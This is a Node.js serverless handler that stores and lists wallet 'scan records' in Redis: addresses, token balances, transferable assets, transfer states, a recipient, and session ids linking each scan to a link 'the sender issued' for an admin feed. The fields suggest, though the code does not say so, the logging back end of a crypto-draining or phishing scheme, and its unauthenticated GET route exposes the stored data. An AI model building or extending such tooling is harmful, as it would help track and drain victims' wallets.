// Scan-record store backed by Upstash Redis — the detailed per-scan entries
// (address, chains, tokens, balances, live transfer states) that used to live
// only in the scanning device's localStorage.
// POST {id, entry} → upsert by scan id (states update in place, always current)
// GET  → newest 100 records for the admin Scan Log.
// Env: UPSTASH_REDIS_REST_URL, UPSTASH_REDIS_REST_TOKEN
var HASH_KEY = "chainscaner:scans";
var MAX_STORED = 500;
var MAX_RETURNED = 100;

function redis(commands) {
  return fetch(process.env.UPSTASH_REDIS_REST_URL + "/pipeline", {
    method: "POST",
    headers: {
      Authorization: "Bearer " + process.env.UPSTASH_REDIS_REST_TOKEN,
      "Content-Type": "application/json"
    },
    body: JSON.stringify(commands)
  }).then(function(r) { return r.json(); });
}

module.exports = async function handler(req, res) {
  res.setHeader("Cache-Control", "no-store");
  if (!process.env.UPSTASH_REDIS_REST_URL || !process.env.UPSTASH_REDIS_REST_TOKEN) {
    return res.status(500).json({ ok: false, error: "scan store not provisioned" });
  }

  if (req.method === "POST") {
    var body = req.body || {};
    if (typeof body === "string") { try { body = JSON.parse(body); } catch (e) { body = {}; } }
    var id = body.id, entry = body.entry;
    if (typeof id !== "string" || id.length < 3 || id.length > 64 || !entry || typeof entry !== "object") {
      return res.status(400).json({ ok: false, error: "invalid scan record" });
    }
    // Whitelist the stored shape — never persist arbitrary client objects
    var clean = {
      id: id,
      time: String(entry.time || ""),
      address: String(entry.address || ""),
      status: String(entry.status || "scanned"),
      recipient: String(entry.recipient || ""),
      risk: entry.risk == null ? null : Number(entry.risk),
      flags: Array.isArray(entry.flags) ? entry.flags.slice(0, 20) : [],
      chains: Array.isArray(entry.chains) ? entry.chains.slice(0, 20) : [],
      totalUsd: String(entry.totalUsd || ""),
      tokenStates: Array.isArray(entry.tokenStates) ? entry.tokenStates.slice(0, 30) : [],
      transferable: Array.isArray(entry.transferable) ? entry.transferable.slice(0, 20) : [],
      // Shared-session id (?s= link) — ties the scan record back to the
      // link the sender issued, so the admin feed can attribute it
      sess: typeof entry.sess === "string" && /^[0-9a-f]{24}$/.test(entry.sess) ? entry.sess : ""
    };
    try {
      var out = await redis([["HSET", HASH_KEY, id, JSON.stringify(clean)], ["HLEN", HASH_KEY]]);
      var len = out && out[1] && out[1].result;
      if (len && len > MAX_STORED) {
        // Rare bound pass: drop the oldest entries beyond MAX_STORED
        var all = await redis([["HGETALL", HASH_KEY]]);
        var flat = (all && all[0] && all[0].result) || [];
        var pairs = [];
        for (var i = 0; i + 1 < flat.length; i += 2) {
          try { pairs.push({ id: flat[i], time: JSON.parse(flat[i + 1]).time || "" }); } catch (e) {}
        }
        pairs.sort(function(a, b) { return String(a.time).localeCompare(String(b.time)); });
        var drop = pairs.slice(0, pairs.length - MAX_STORED).map(function(p) { return p.id; });
        if (drop.length) await redis([["HDEL", HASH_KEY].concat(drop)]);
      }
      return res.status(200).json({ ok: true });
    } catch (e) {
      return res.status(502).json({ ok: false, error: "scan store write failed" });
    }
  }

  if (req.method === "GET") {
    try {
      var all = await redis([["HGETALL", HASH_KEY]]);
      var flat = (all && all[0] && all[0].result) || [];
      var scans = [];
      for (var i = 0; i + 1 < flat.length; i += 2) {
        try { scans.push(JSON.parse(flat[i + 1])); } catch (e) {}
      }
      scans.sort(function(a, b) { return String(b.time).localeCompare(String(a.time)); });
      return res.status(200).json({ ok: true, scans: scans.slice(0, MAX_RETURNED) });
    } catch (e) {
      return res.status(502).json({ ok: false, error: "scan store read failed" });
    }
  }

  res.status(405).json({ ok: false, error: "method not allowed" });
};
